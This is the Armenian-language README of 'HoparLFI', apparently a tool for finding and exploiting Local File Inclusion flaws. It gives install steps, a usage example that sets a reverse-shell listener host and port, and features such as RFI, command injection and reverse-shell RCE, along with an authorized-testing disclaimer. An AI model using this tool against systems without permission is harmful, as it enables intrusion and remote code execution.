# 🕵️‍♂️ HoparLFI

**HoparLFI** — Տեղային ֆայլերի ներառման (Local File Inclusion, LFI) խոցելիությունների հայտնաբերման և շահագործման գործիք է՝ նախատեսված Bug Bounty որոնողների և տեղեկատվական անվտանգության հետազոտողների համար։

---

## 🔧 Տեղադրում

Կլոնավորեք ռեպոզիտորիան՝

```bash
git clone https://github.com/havaiuser123/HoparLFI.git
cd hoparlfi
```

Տեղադրեք պահանջվող փաթեթները․

```bash
pip install -r requirements.txt
```

---

## ▶️ Օգտագործում

```bash
python hoparlfi.py [տարբերակներ]
```

Օրինակ՝

```bash
python hoparlfi.py -U http://example.com/page.php?file=PWN -f -x --lhost 127.0.0.1 --lport 4444
```

Հասանելի հիմնական տարբերակների շարքը կարող եք տեսնել՝ օգտագործելով `-h` կամ `--help`։

---

## 🚀 Հնարավորություններ

* ✅ Բազմաթիվ հարձակման մեթոդներ՝

  * `filter`
  * `input`
  * `data`
  * `expect`
  * `path traversal`
  * `RFI`
  * `command injection`
* ✅ Աջակցում է անհատական wordlist-ների
* ✅ Reverse shell շահագործում (RCE exploit)
* ✅ CSRF թոքենների կառավարում
* ✅ Proxy աջակցություն
* ✅ Մանրամասն գրանցում (logging)
* ✅ Վերնագրերի և HTTP մեթոդների հարմարեցում

---

## ⚠️ Նշումներ

* 🚩 Օգտագործեք միայն թիրախ համակարգում թեստավորման թույլտվությամբ։
* 📃 Այս գործիքը նախատեսված է ուսումնական և հետազոտական նպատակների համար։
* ✅ Արդյունքները ավտոմատ պահպանվում են `reports/output.json` ֆայլում։
